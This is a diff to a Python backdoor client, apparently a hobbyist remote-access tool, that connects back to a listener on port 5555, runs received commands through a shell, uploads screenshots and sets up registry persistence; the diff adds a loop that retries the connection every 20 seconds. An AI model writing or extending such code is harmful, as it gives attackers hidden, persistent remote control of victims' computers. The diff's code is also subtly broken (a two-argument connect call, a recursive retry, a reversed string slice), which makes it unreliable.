@@ -2,6 +2,7 @@ import socket
 import json
 import subprocess
 import os
+import time
 import termcolor
 import pyautogui
 import shutil
@@ -54,6 +55,17 @@ def persist(reg_name, copy_name):
     except:
         reliable_send(termcolor.colored('[+] Error Creating Persistence with the target machine'), 'red', attrs=['bold'])
 
+def connection():
+    while True:
+        time.sleep(20)
+        try:
+            s.connect('127.0.0.1', 5555)
+            shell()
+            s.close()
+            break
+        except:
+            connection()
+
 
 def shell():
     while True:
@@ -75,7 +87,7 @@ def shell():
             upload_file('screen.png')
             os.remove('screen.png')
         elif command[:11] == 'persistence':
-            reg_name, copy_name = command[12:].split(' ')
+            reg_name, copy_name = command[:12].split(' ')
             persist(reg_name,  copy_name)
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -84,5 +96,4 @@ def shell():
             reliable_send(result)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('127.0.0.1', 5555))
-shell()
+connection()
